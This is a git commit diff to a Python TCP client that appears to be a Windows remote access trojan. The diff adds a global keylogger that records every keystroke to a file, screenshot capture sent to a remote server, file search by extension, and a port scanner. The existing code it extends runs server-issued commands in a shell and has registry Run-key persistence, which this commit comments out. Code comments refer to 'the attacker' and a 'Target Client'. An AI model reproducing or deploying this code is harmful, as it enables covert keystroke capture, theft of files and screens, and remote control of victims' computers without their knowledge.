41cd85f817f9ef83a01efe595196afb4552de710
polzbit <38733198+polzbit@users.noreply.github.com>
2021-08-12 11:49:45 +0300

    Add files via upload

--- src/client/tcp_client.py
+++ src/client/tcp_client.py
@@ -2,10 +2,42 @@
 import socket       
 import subprocess
 import os
-from shutil import copy
+from tempfile import mkdtemp
+from shutil import copy, rmtree
 import winreg as wreg
 from random import randrange
+from PIL import ImageGrab
 from time import sleep
+from pythoncom import PumpMessages
+from pyWinhook import HookManager
+
+def keypressed(event):
+    global store
+    # Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>
+    # note that we can know if the user input was enter or backspace based on their ASCII values
+    keys = ''
+    if event.Ascii==13:
+        keys=' < Enter > ' 
+    elif event.Ascii==8:
+        keys=' <BACK SPACE> '
+    else:
+        keys=chr(event.Ascii)
+    store += keys 
+    
+    fp=open("keylogs.txt","w")
+    fp.write(store)
+    fp.close()
+    return True
+
+# string where we will store all the pressed keys
+store = ''
+# create and register a hook manager and once the user hit any keyboard button, 
+# keypressed func will be executed
+obj = HookManager()
+obj.KeyDown = keypressed
+# start the hooking loop and pump out the messages
+obj.HookKeyboard()
+PumpMessages()
 
 class Client:
     ''' Target Client '''
@@ -15,14 +47,37 @@ class Client:
         # Persistence I: copy script to random appdata location
         self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
         self.PATH = os.path.realpath(__file__)
-        copy(self.PATH, self.APPDATA_PATH)
+        # copy(self.PATH, self.APPDATA_PATH)
         # Persistence II: registry key pointing to the copied file
-        self.addRegkey()
+        # self.addRegkey()
 
     def addRegkey(self):
         key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
         wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
         key.Close()
+
+    def scanner(self,s, ip, ports):
+        scan_result = ''
+        for port in ports.split(','): 
+            # ports are separated by a comma in this format 21,22,..
+            # make a connection using socket library for EACH one of these ports
+            try:   
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                # connect_ex returns 0 if the operation succeeded, and in our case operation succeeded means that 
+                # the port is open otherwise the port could be closed or the host is unreachable in the first place.
+                output = sock.connect_ex((ip, int(port) )) 
+                
+                if output == 0:
+                    scan_result += f"[+] Port {port} is opened\n"
+                else:
+                    scan_result += f"[-] Port {port} is closed or Host is not reachable\n" 
+                    
+                sock.close()
+        
+            except Exception as e:
+                pass
+        # send results to server
+        s.send(scan_result.encode()) 
 
     def transfer(self, s, path):
         ''' send transfer file '''
@@ -47,7 +102,6 @@ class Client:
         while True: 
             # read the first KB of the tcp socket
             command = s.recv(1024).decode()         
-            print(command)
             if 'terminate' in command:
                 # if we got terminate order from server, 
                 # close the socket and break the loop
@@ -63,15 +117,40 @@ class Client:
                 except Exception as e:
                     s.send(str(e).encode()) 
             elif 'grab' in command: 
-                # if we received grab keyword from the attacker, then this is an indicator for
-                # file transfer operation, hence we will split the received commands into two
-                # parts, the second part which we intrested in contains the file path, so we will
-                # store it into a variable called path and pass it to transfer function
+                # on grab, indicate for file transfer operation.
                 path = command.split()[-1]
                 try: 
                     self.transfer(s, path)
                 except Exception as e:
-                    s.send(str(e).encode()) 
+                    s.send(str(e).encode())
+            elif 'screenshoot' in command: 
+                # on screenshoot, take screen image and send it to server 
+                dirpath = mkdtemp()
+                ImageGrab.grab().save(dirpath + "/screen.jpg", "JPEG")
+                try: 
+                    self.transfer(s, dirpath + "/screen.jpg")
+                    rmtree(dirpath) 
+                except Exception as e:
+                    s.send(str(e).encode())
+            elif 'search' in command: 
+                # cut off 'search' keyward, output would be C:\\*.pdf
+                command = command[7:] 
+                # split command to path and ext
+                path, ext = command.split('*') 
+                file_list = '' 
+                
+                for dirpath, dirnames, files in os.walk(path):
+                    for f in files:
+                        if f.endswith(ext):
+                            file_list = file_list + '\n' + os.path.join(dirpath, f)
+                # Send search result to server
+                s.send(file_list.encode())
+            elif 'scan' in command: 
+                # syntax: scan 10.0.2.15:22,80
+                # cut off 'scan' keyward
+                command = command[5:]
+                ip, ports = command.split(':') 
+                self.scanner(s, ip, ports)
             else: 
                 # otherwise, we pass the received command to a shell process
                 cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
